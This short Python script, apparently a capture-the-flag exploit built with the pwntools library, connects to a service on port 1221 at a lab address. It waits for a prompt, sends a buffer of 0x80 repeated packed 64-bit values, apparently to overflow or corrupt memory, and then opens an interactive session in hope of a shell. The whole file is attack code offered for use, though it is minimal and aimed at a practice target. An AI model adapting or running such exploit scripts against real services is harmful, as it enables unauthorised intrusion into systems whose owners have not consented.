from pwn import *

HOST = ""
PORT = 1221
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.20',PORT)
s.recvuntil('>')
dat = p64(0x2)
s.sendline(dat *0x80)
s.interactive()
